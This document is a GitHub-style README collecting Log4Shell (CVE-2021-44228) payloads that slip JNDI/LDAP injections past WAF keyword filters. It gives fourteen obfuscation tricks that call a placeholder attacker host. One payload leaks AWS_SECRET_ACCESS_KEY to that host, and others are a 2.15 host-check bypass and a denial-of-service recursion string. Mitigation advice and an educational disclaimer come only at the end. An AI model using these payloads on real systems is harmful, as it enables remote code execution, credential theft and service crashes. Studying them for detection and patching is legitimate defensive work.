# 📝 Description
🐱‍💻 ✂️ 🤬 LOG4J Java exploit - A trick to bypass words blocking patches

**CVE-2021-44228** works on:

log4j: 2.0 <= Apache log4j <= 2.14.1

Java version already patched: 6u211+, 7u201+, 8u191+,  11.0.1+.

**Windows Defender started to remove .java files that include jndi:ldap:....**

Simple attacker script (Possible RCE):

`${jndi:ldap://somesitehackerofhell.com/z}`

WAF or developers started to block phrases:
- "ldap:"
- "jndi:"
  
to secure applications.


However, the attacker can bypass it by using one of these techniques:

## 1. System environment variables
   
`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}`

From Apache Log4j 2 documentation: `${env:ENV_NAME:-default_value}`

If there is no **ENV_NAME** system environment variable, use text after **:-** 

The attacker can use any name instead of **ENV_NAME**, but it has to no exists.

Or the hacker can read environment variable, example for **AWS_SECRET_ACCESS_KEY**:

`${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}`

Check out more secrets in [🦄🔒 Awesome list of secrets in environment variables 🖥️](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables)

You can check your system environment variables:

- On Windows execute in PowerShell: `dir env:`
- On Linux/MacOS execute in terminal: `printenv` or `env`


---
## 2. Lower or Upper Lookup

`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}`

`${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}`

**Lower Lookup**
The LowerLookup converts the passed in argument to lower case. Presumably the value will be the
result of a nested lookup.


`${lower:<text>}`


**Upper Lookup**
The UpperLookup converts the passed in argument to upper case. Presumably the value will be the
result of a nested lookup.


`${upper:<text>}`

---
## 3. "::-" notation

`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}`

---

## 4. Invalid Unicode characters with upper


`${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}`

ı get converted to i 

---

## 5. System properties

`${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}`

If there is no **SYS_NAME** system property, use text after **:-** 

---

## 6. ":-" notation

`${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}`

---

## 7. Date

`${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://somesitehackerofhell.com/z}`

Java date formatting converts YYYY to 2021, but it converts 'YYYY' to YYYY or 'j' to j.

---

## 8. HTML URL Encoding
Replace characters with:
- **}** with **%7D**
- **{** with **%7B**
- **$** with **%24**

You can read more here [HTML URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.ASP)

---

## 9. Non-existent lookup

`${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}`

It does not verify the existence of lookup and just evaluates to default happily.


---

## 10. Polymorphic (JSON REST API request)
<br>

    {
        "one-${jnd${a":"a:-i}:ld${",
        "two":"o:-a}p://somesitehackerofhell.com/z}
    }

"Separately these keys and values do not represent an attack. But all them together is an attack and this attack is transparent to the detection systems because of the JSON parser." [Read more...](https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73)

---

## 11. Unicode Characters (JSON REST API request)

`${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}`

Convert some characters to unicode.

[Unicode converter Online](https://www.branah.com/unicode-converter)

---

## 12. Trick with \# (works on log4j 2.15)

`${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}`

Bypass allowedLdapHost and allowedClasses checks in Log4J 2.15.0. The java.net.URI getHost() method returns the value before the # as the real host. But the JNDI/LDAP resolver will resolve to the full hostname string attempting to connect to the malicious LDAP server.

[Read more...](https://twitter.com/marcioalm/status/1471742744347348997)


---

## 13. Dos attack (Works on log4j 2.8 - 2.16 - CVE-2021-45105 )

`${${::-${::-$${::-j}}}}`

If a string substitution is attempted for any reason on the following string, it will trigger an infinite recursion, and the application will **crash**.

[Read more...](https://issues.apache.org/jira/browse/LOG4J2-3230)

---

## 14. PDF as delivery channel.

Craft special pdf file to exploit CVE-2021-44228

![PDF example](https://user-images.githubusercontent.com/12344862/147821759-3532d8f8-2378-4405-a333-e56d8e7e7a8a.png)



[Get a pdf file and read more...](https://github.com/eelyvy/log4jshell-pdf)
# Testing
To test entry you can use:

- https://canarytokens.org/generate - Choose token **Log4Shell** (entry notification will be send by email or webhook), generate and replace somesitehackerofhell.com/z
- https://dnslog.cn/ - Generate subdomain and replace somesitehackerofhell.com/z

# ✨ Best solution to protect from CVE-2021-44228
tl;dr Update to `log4j-2.17.1` or later.

**Log4j 1.x mitigation**: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.

**Log4j 2.x mitigation**: Implement one of the mitigation techniques below.

- Java 8 (or later) users should upgrade to release 2.17.1.
- Users requiring Java 7 should upgrade to release 2.12.4 when it becomes available (work in progress, expected to be available soon).
- Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class and remove references to Context Lookups like ${ctx:loginId} or $${ctx:loginId} where they originate from sources external to the application such as HTTP headers or user input.


Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.

[Source and read more...](https://logging.apache.org/log4j/2.x/security.html)

## Keep it safe!


# 🤝 Show your support

## **Give a ⭐️ if you liked the content or meme**
![log2](https://user-images.githubusercontent.com/12344862/146371807-28e23db1-ef93-4b6f-94f0-0f5f248f4d56.jpg)



# 📝 Useful links
- [Apache Log4j 2 v. 2.15.0 - User's Guide](https://logging.apache.org/log4j/2.x/log4j-users-guide.pdf)
- [Possible first publication of lower/upper bypass](https://twitter.com/stereotype32/status/1469313856229228544)
- [CVE-2021-44228 (Apache Log4j Remote Code Execution)](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
- [HTML URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.ASP)
- [GitHub Reviewed CVE-2021-44228 - Remote code injection in Log4j](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [Program log4j-detector - Detects Log4J versions on your file-system within any application that are vulnerable to CVE-2021-44228 and CVE-2021-45046](https://github.com/mergebase/log4j-detector)
- [Polymorphic Log4J exploit that is a valid JSON REST API request](https://twitter.com/d0znpp/status/1471207731327483905)
- [Bypassing NGFW/WAFs using data format obfuscations](https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73)
- [LOG4J2-3230 Certain strings can cause infinite recursion](https://issues.apache.org/jira/browse/LOG4J2-3230)
- [Here is a PoC in how to bypass allowedLdapHost and allowedClasses checks in Log4J 2.15.0](https://twitter.com/marcioalm/status/1471740771581652995)
- [🦄🔒 Awesome list of secrets in environment variables 🖥️](https://github.com/Puliczek/awesome-list-of-secrets-in-environment-variables)
- [Exploiting CVE-2021-44228 using PDFs as delivery channel - PoC](https://github.com/eelyvy/log4jshell-pdf)

# 🙌 Thanks to users for contribution

-  All Contributors
-  **Whatsec** for more bypasses examples
-  **manjula-aw** for improvement to section of security
-  **juliusmusseau** for one more bypass examples


# ✔️ Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.

I am not an author of CVE-2021-44228 and some bypasses
